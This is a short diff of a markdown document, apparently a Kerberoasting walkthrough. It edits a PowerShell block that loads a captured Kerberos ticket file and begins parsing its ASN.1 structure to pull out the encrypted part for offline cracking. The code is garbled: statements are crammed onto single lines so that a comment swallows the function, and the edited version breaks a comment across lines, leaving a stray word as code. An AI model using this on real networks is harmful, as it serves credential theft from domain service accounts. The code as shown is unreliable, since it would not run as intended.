@@ -409,6 +409,6 @@ $ticket.GetRequest()
 ```
 
 ```POWERSHELL
-# Load the raw ticket bytes retrieved earlier 
-$bytes = [System.IO.File]::ReadAllBytes("$pwd\ticket.kirbi") # Minimal ASN.1 walker to locate the Ticket -> enc-part -> cipher OCTET STRING function Get-Asn1Length { param([byte[]]$Data, [ref]$Offset) $len = $Data[$Offset.Value]; $Offset.Value++ if ($len -band 0x80) { $numBytes = $len -band 0x7F $len = 0 for ($i = 0; $i -lt $numBytes; $i++) { $len = ($len -shl 8) -bor $Data[$Offset.Value] $Offset.Value++ } } return $len } # NOTE: Full KRB_AP_REQ ASN.1 traversal (APPLICATION 14 -> AP-REQ SEQUENCE -> # ticket [1] -> Ticket SEQUENCE -> enc-part [3] -> EncryptedData SEQUENCE -> # etype [0] INTEGER, cipher [2] OCTET STRING) requires walking several nested # tagged fields. Writing a robust byte-offset parser by hand here is error-prone # and easy to get subtly wrong (wrong offset = garbage hash = silent failure).
+$bytes = [System.IO.File]::ReadAllBytes("$pwd\ticket.kirbi") # Minimal ASN.1 walker to locate the Ticket -> enc-part -> cipher OCTET 
+STRING function Get-Asn1Length { param([byte[]]$Data, [ref]$Offset) $len = $Data[$Offset.Value]; $Offset.Value++ if ($len -band 0x80) { $numBytes = $len -band 0x7F $len = 0 for ($i = 0; $i -lt $numBytes; $i++) { $len = ($len -shl 8) -bor $Data[$Offset.Value] $Offset.Value++ } } return $len
 ```
